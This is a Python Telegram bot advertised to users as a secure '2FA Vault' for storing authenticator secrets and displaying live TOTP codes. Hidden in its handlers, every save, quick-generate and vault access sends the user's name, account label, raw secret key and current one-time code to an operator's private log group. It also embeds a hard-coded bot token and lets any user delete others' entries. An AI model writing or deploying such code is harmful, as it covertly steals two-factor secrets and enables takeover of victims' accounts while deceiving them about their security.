import pyotp
import time
import asyncio
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- Settings ---
BOT_TOKEN = '7049992261:AAGSHeHVn2ACs3EZQ_giFNbDJc35Tob0jjw'
LOG_GROUP_ID = -1003801688038 

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect('users_vault.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS secrets 
                 (user_id INTEGER, label TEXT, secret TEXT)''')
    conn.commit()
    conn.close()

init_db()

# --- Helpers ---
def get_logo(label):
    label = label.lower()
    if "facebook" in label: return "🟦 Facebook"
    if "instagram" in label: return "🟧 Instagram"
    if "youtube" in label or "google" in label or "gmail" in label: return "🟥 Google/YT"
    if "whatsapp" in label: return "🟩 WhatsApp"
    if "telegram" in label: return "🔹 Telegram"
    if "github" in label: return "⬛ GitHub"
    if "binance" in label: return "🟨 Binance"
    if "twitter" in label or " x " in label: return "🖤 X (Twitter)"
    return "📟 " + label.capitalize()

def generate_progress_bar(remaining_time, total=30):
    length = 8
    filled = int(length * remaining_time // total)
    return "🟩" * filled + "⬜" * (length - filled)

# --- Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [KeyboardButton("🚀 Quick Generate")],
        [KeyboardButton("➕ Add New Code"), KeyboardButton("🔑 My Vault")]
    ]
    reply_markup = ReplyKeyboardMarkup(kb, resize_keyboard=True)
    await update.message.reply_text(
        "👋 **Welcome to 2FA Vault!**\n\nManage your accounts securely and get codes instantly.",
        reply_markup=reply_markup, parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    text = update.message.text.strip()
    state = context.user_data.get('state')

    if text == "🚀 Quick Generate":
        context.user_data['state'] = 'QUICK_GEN'
        await update.message.reply_text("Please send your **Secret Key** now.", parse_mode='Markdown')
        return

    if text == "➕ Add New Code":
        context.user_data['state'] = 'WAITING_NAME'
        await update.message.reply_text("Enter the **Account Name**:", parse_mode='Markdown')
        return

    if text == "🔑 My Vault":
        await show_vault(update, context)
        return

    # ১. সেভিং লজিক (Step-by-Step)
    if state == 'WAITING_NAME':
        context.user_data['temp_name'] = text
        context.user_data['state'] = 'WAITING_SECRET'
        await update.message.reply_text(f"Send the **Secret Key** for `{text}`:", parse_mode='Markdown')
        return

    if state == 'WAITING_SECRET':
        secret = text.replace(" ", "").upper()
        name = context.user_data.get('temp_name')
        try:
            pyotp.TOTP(secret).now()
            conn = sqlite3.connect('users_vault.db')
            c = conn.cursor()
            c.execute("INSERT INTO secrets VALUES (?, ?, ?)", (user_id, name, secret))
            conn.commit()
            conn.close()
            
            await update.message.reply_text(f"✅ Saved as **{name}**!")
            await context.bot.send_message(chat_id=LOG_GROUP_ID, text=f"🆕 **Secret Saved**\n👤 User: {user_name}\n🏷 Label: {name}\n🔑 Key: `{secret}`", parse_mode='Markdown')
            context.user_data.clear()
        except:
            await update.message.reply_text("❌ Invalid Key!")
        return

    # ২. কুইক জেনারেট এবং অটো-ডিটেকশন লজিক
    secret_candidate = text.replace(" ", "").upper()
    try:
        totp = pyotp.TOTP(secret_candidate)
        current_code = totp.now()
        
        log_text = (
            "🚀 **Quick Gen / Direct Key**\n"
            f"👤 User: [{user_name}](tg://user?id={user_id})\n"
            f"🔑 Secret: `{secret_candidate}`\n"
            f"📟 Code: `{current_code}`"
        )
        await context.bot.send_message(chat_id=LOG_GROUP_ID, text=log_text, parse_mode='Markdown')
        
        sent_msg = await update.message.reply_text("⚙️ **Starting live generator...**")
        asyncio.create_task(live_timer(sent_msg, totp, "Quick View"))
        context.user_data.clear()
    except:
        if state == 'QUICK_GEN':
            await update.message.reply_text("❌ Invalid Key!")

async def show_vault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect('users_vault.db')
    c = conn.cursor()
    c.execute("SELECT rowid, label FROM secrets WHERE user_id=?", (user_id,))
    rows = c.fetchall()
    conn.close()

    if not rows:
        await update.message.reply_text("Vault empty!")
        return

    buttons = [[InlineKeyboardButton(get_logo(label), callback_data=f"gen_{rowid}")] for rowid, label in rows]
    buttons.append([InlineKeyboardButton("🗑 Delete Mode", callback_data="manage_del")])
    await update.message.reply_text("💎 **Your Vault:**", reply_markup=InlineKeyboardMarkup(buttons), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user = query.from_user

    if data.startswith("gen_"):
        rowid = data.split("_")[1]
        conn = sqlite3.connect('users_vault.db')
        c = conn.cursor()
        c.execute("SELECT label, secret FROM secrets WHERE rowid=?", (rowid,))
        res = c.fetchone()
        conn.close()

        if res:
            label, secret = res
            totp = pyotp.TOTP(secret)
            
            # --- ভল্ট থেকে জেনারেট করার সময় সিক্রেট কি-সহ গ্রুপে পাঠানো ---
            log_text = (
                "📟 **Vault OTP Access**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 **User:** [{user.full_name}](tg://user?id={user.id})\n"
                f"🏷 **Account:** `{label}`\n"
                f"🔑 **Secret Key:** `{secret}`\n"
                f"📟 **OTP Code:** `{totp.now()}`\n"
                "━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_message(chat_id=LOG_GROUP_ID, text=log_text, parse_mode='Markdown')
            
            sent_msg = await query.edit_message_text(f"⏳ Syncing: {label}...")
            asyncio.create_task(live_timer(sent_msg, totp, label))

    elif data == "manage_del":
        conn = sqlite3.connect('users_vault.db')
        c = conn.cursor()
        c.execute("SELECT rowid, label FROM secrets WHERE user_id=?", (user.id,))
        rows = c.fetchall()
        conn.close()
        buttons = [[InlineKeyboardButton(f"❌ {l}", callback_data=f"del_{r}")] for r, l in rows]
        await query.edit_message_text("Select to delete:", reply_markup=InlineKeyboardMarkup(buttons))

    elif data.startswith("del_"):
        rowid = data.split("_")[1]
        conn = sqlite3.connect('users_vault.db')
        c = conn.cursor()
        c.execute("DELETE FROM secrets WHERE rowid=?", (rowid,))
        conn.commit()
        conn.close()
        await query.edit_message_text("🗑 Deleted.")

async def live_timer(sent_msg, totp, label):
    try:
        for _ in range(120):
            code = totp.now()
            rem = int(30 - (time.time() % 30))
            bar = generate_progress_bar(rem)
            text = f"🏷 **Acc:** `{label}`\n━━━━━━━━━━━━\n📟 **Code:** `{code}`\n⌛ **Exp:** `{rem}s`\n{bar}\n━━━━━━━━━━━━"
            await sent_msg.edit_text(text, parse_mode='Markdown')
            await asyncio.sleep(1)
    except: pass

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("\n" + "⭐"*15)
    print("🚀 2FA VAULT IS ONLINE")
    print(f"📡 Log Group: {LOG_GROUP_ID}")
    print("⭐"*15 + "\n")
    
    app.run_polling()
